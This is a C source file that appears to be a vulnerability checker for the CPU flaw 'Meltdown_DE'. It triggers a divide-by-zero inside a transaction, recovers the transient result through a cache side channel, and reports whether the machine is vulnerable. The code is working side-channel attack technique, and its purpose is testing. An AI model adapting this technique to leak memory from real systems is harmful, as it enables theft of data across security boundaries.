#define _GNU_SOURCE
#include <memory.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>

#include "libcache/cache.h"
#include "lib/global.h"

void main(int argc, char **argv)
{
    PREPARE();
    printf("Meltdown_DE Begins...\n");
    volatile int d = 0;
    // Flush our shared memory
    flush_shared_memory();

    for (int r = 0; r < MAX_TRY_TIMES; r++)
    {
        if (try_start())
        {
            // Null pointer access makes attack better
            maccess(0);
            // Encode result of division in the cache
            maccess(mem + ('1' / d + '3') * 4096);

            try_abort();
        }
        try_end();

        // Recover data from the cache
        if (cache_decode() == 'd')
        {
            passed_count++;
        }
    }

    if ((double)passed_count / MAX_TRY_TIMES > 0.3)
    {
        printf(ANSI_COLOR_RED "Meltdown_DE: Vulnerable\n" ANSI_COLOR_RESET);
    }
    else
    {
        printf(ANSI_COLOR_GREEN "Meltdown_DE: Not Vulnerable\n" ANSI_COLOR_RESET);
    }
    printf("Meltdown_DE done!\n\n");
}